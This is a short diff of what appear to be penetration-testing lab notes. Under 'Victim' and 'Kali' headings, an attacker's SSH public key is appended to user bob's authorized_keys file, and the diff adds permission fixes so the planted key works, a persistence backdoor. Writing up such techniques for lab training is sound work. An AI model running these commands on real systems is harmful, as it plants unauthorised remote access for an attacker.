@@ -12,6 +12,8 @@ cat ~/lab/bob/.ssh/id_rsa.pub
 # Victim  
 cd /home/bob/.ssh/ 
 echo ssh-rsa AAAAB3NzaC1Tz8a4ELx2k= kali@kali >> authorized_keys  
+chmod 0700 /home/bob/.ssh
+chmod 0600 /home/bob/.ssh/authorized_keys
 
 # Kali  
 chmod 600 ~/lab/bob/.ssh/id_rsa 
